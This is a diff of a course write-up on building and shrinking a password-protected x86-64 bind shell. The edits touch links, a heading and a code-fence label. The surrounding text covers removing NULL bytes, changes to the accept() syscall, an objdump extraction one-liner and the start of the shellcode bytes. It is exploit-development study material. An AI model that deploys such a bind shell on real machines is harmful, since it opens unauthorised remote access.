@@ -280,7 +280,7 @@ If the password is incorrect, program will exit with a Segmentation Fault:
 ### Remove NULLs and Reduce Shellcode Size
 ---
 
-> The final ASM code after the changes explained in this section, can be found at the [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/Assignment01/BindShell-Execve-Stack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
+> The final ASM code after the changes explained in this section, can be found at the [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
 
 The actual shellcode has several NULLs and a size of 274 bytes (too much!). Using `objdump` will get the opcodes and review the NULLs in the shellcode:
 
@@ -388,7 +388,8 @@ compare_passwords:
 ```
 Also, the code for the `close()` can be removed, as the socket descriptor is not used anymore once the `accept()` get a connection. 
 
-**_UPDATE_** Now let's use a trick learned from [Assignment05-1](Assignment05_1). For the `accept()` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the `sockaddr` struct. This is not a problem, as this data is not used in the code. From this syscall is needed the socked descriptor returned in **RAX**. In `man 2 accept` this is explained. Then, the code for the `accept()` section ends like this:
+#### _UPDATE_ Trick Learned in [Assignment05-1](Assignment05-1)
+Now let's use a trick learned. For the `accept()` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the `sockaddr` struct. This is not a problem, as this data is not used in the code. From this syscall is needed the socked descriptor returned in **RAX**. In `man 2 accept` this is explained. Then, the code for the `accept()` section ends like this:
 ```asm
 ; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
         ;       RDI already has the sock_id
@@ -406,7 +407,7 @@ Also, the code for the `close()` can be removed, as the socket descriptor is not
 
 Using the one liner command for `objdump` the shellcode is dumped, this time, with a size of **only 142 bytes**:
 
-```markdown
+```bash
 SLAE64> echo “\"$(objdump -d BindShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
               cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
 "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
